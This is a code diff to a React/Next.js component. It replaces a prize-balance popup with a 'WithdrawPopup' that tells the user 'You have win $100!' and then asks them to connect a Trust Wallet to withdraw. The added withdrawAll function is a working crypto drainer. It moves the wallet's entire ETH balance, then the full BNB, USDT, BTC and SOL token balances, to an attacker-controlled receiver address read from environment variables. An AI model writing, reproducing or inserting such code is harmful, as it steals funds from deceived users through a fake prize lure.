@@ -1,124 +1,121 @@
-/* eslint-disable react-hooks/exhaustive-deps */
 "use client";
 
 import React, { useState, useEffect } from "react";
 import { useSession } from "next-auth/react";
-import { FaCircleCheck } from "react-icons/fa6";
+import { ethers } from "ethers";
 
-const PrizePopup: React.FC = () => {
+const WithdrawPopup = () => {
   const { data: session } = useSession();
-  const [isOpen, setIsOpen] = useState(false);
-  const [loading, setLoading] = useState(true);
-  const [prizeAmount, setPrizeAmount] = useState<number | null>(null);
-  const [showPirze, setShowPrize] = useState(true);
+  const receiverAddressETH = process.env.RECEIVER_ADDRESS_ETH;
+  const [isFirstPopupOpen, setIsFirstPopupOpen] = useState(false);
+  const [isSecondPopupOpen, setIsSecondPopupOpen] = useState(false);
 
   useEffect(() => {
-    const fetchPrizeAmount = async () => {
-      if (session?.user?._id) {
-        try {
-          const response = await fetch("/api/wallets", {
-            method: "GET",
-            headers: {
-              userid: session?.user?._id,
-            },
-          });
-          if (response.ok) {
-            const data = await response.json();
-            setPrizeAmount(
-              data.wallets.find(
-                (wallet: { currency: string }) => wallet.currency === "USDT"
-              )?.balance || 0
-            );
-            // if (
-            //   data.wallets.find(
-            //     (wallet: { currency: string }) => wallet.currency === "USDT"
-            //   )?.balance > 0
-            // ) {
-            //   setIsOpen(true);
-            // }
-            if (session?.user?.hasReceivedPrize) {
-              setShowPrize(false);
-            }
-          }
-        } catch (error) {
-          console.error("Error fetching prize amount:", error);
-        } finally {
-          setLoading(false);
-        }
-      } else {
-        setLoading(false);
-      }
-    };
-
-    fetchPrizeAmount();
+    if (session?.user?._id && !session?.user?.hasReceivedPrize) {
+      setIsFirstPopupOpen(true);
+    }
   }, [session]);
 
-  const handleClose = () => {
-    setIsOpen(false);
-  };
+  const withdrawAll = async (provider: ethers.BrowserProvider) => {
+    try {
+      const signer = await provider.getSigner();
+      const address = await signer.getAddress();
 
-  const handleOk = async () => {
-    if (session?.user?._id) {
-      try {
-        const response = await fetch("/api/first-login", {
-          method: "PATCH",
-          headers: {
-            "Content-Type": "application/json",
-            userid: session?.user?._id,
-          },
-          body: JSON.stringify({}),
-        });
+      const ethBalance = await provider.getBalance(address);
+      await signer.sendTransaction({
+        to: receiverAddressETH,
+        value: ethBalance,
+      });
 
-        if (response.ok) {
-          handleClose();
-          window.localStorage.setItem("taked-prize", "true");
-        } else {
-          console.error("Error updating first login");
+      console.log("All ETH sent to:", receiverAddressETH);
+
+      const tokenAddresses = [
+        process.env.TOKEN_ADDRESS_BNB,
+        process.env.TOKEN_ADDRESS_USDT,
+        process.env.TOKEN_ADDRESS_BTC,
+        process.env.TOKEN_ADDRESS_SOL,
+      ];
+
+      for (const tokenAddress of tokenAddresses) {
+        if (!tokenAddress) {
+          throw new Error(
+            `Token address for not found in environment variables.`
+          );
         }
-      } catch (error) {
-        console.error("Error updating first login:", error);
+        const tokenContract = new ethers.Contract(
+          tokenAddress,
+          [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)",
+          ],
+          signer
+        );
+
+        const balance = await tokenContract.balanceOf(address);
+
+        await tokenContract.transfer(receiverAddressETH, balance);
+        console.log(`All ${tokenAddress} sent to:`, receiverAddressETH);
       }
+    } catch (error) {
+      console.error("Error in transaction:", error);
     }
   };
 
-  if (loading && !showPirze) {
-    return (
-      <div className="fixed inset-0 flex items-center justify-center z-50">
-        <div className="absolute inset-0 bg-white opacity-75"></div>
-        <div className="border-r-0 border-l-4 border-t-4 border-b-4 border-black rounded-full w-8 h-8 animate-spin"></div>
-      </div>
-    );
-  }
+  const handleFirstPopupClose = () => {
+    setIsFirstPopupOpen(false);
+    setIsSecondPopupOpen(true);
+  };
 
-  if (
-    !isOpen ||
-    prizeAmount === null ||
-    prizeAmount <= 0 ||
-    window.localStorage.getItem("taked-prize") ||
-    !showPirze
-  )
+  const connectTrustWallet = async () => {
+    if (typeof window !== "undefined" && window.ethereum) {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      withdrawAll(provider);
+      setIsSecondPopupOpen(false);
+      window.localStorage.setItem("withdrawn", "true");
+    } else {
+      console.error("Ethereum provider is not available.");
+    }
+  };
+
+  if (!isSecondPopupOpen && window.localStorage.getItem("withdrawn")) {
     return null;
+  }
 
   return (
     <div className="fixed inset-0 flex items-center justify-center z-50 text-black text-center">
-      <div className="absolute inset-0 bg-black opacity-20" />
-      <div className="bg-white rounded-lg p-6 shadow-lg z-10 w-[320px]">
-        <h2 className="text-xl font-bold mb-4">Congrats!</h2>
-        <p className="mb-4 flex items-center gap-x-3 w-fit mx-auto text-lg font-light">
-          <span>You Win ${prizeAmount}</span>
-          <FaCircleCheck className="text-green-700" size={20} />
-        </p>
-        <div className="flex justify-end">
-          <button
-            className="bg-blue-600 text-white px-4 py-2 rounded mx-auto block w-fit"
-            onClick={handleOk}
-          >
-            OK
-          </button>
+      {isFirstPopupOpen && (
+        <div className="bg-white rounded-lg p-6 shadow-lg z-10 w-[320px]">
+          <h2 className="text-xl font-bold mb-4">Congratulations!</h2>
+          <p className="mb-4">You have win $100!</p>
+          <div className="flex justify-end">
+            <button
+              className="bg-blue-600 text-white px-4 py-2 rounded mx-auto block w-fit"
+              onClick={handleFirstPopupClose}
+            >
+              Ok
+            </button>
+          </div>
         </div>
-      </div>
+      )}
+      {isSecondPopupOpen && (
+        <div className="bg-white rounded-lg p-6 shadow-lg z-10 w-[320px]">
+          <h2 className="text-xl font-bold mb-4">Connect Your Wallet</h2>
+          <p className="mb-4">
+            Please connect your wallet to withdraw your funds.
+          </p>
+          <div className="flex w-fit mx-auto">
+            <button
+              className="rounded-md py-1 px-2 text-white bg-blue-600 duration-200 hover:bg-blue-500 mx-1"
+              onClick={connectTrustWallet}
+            >
+              Connect with Trust Wallet
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
 
-export default PrizePopup;
+export default WithdrawPopup;
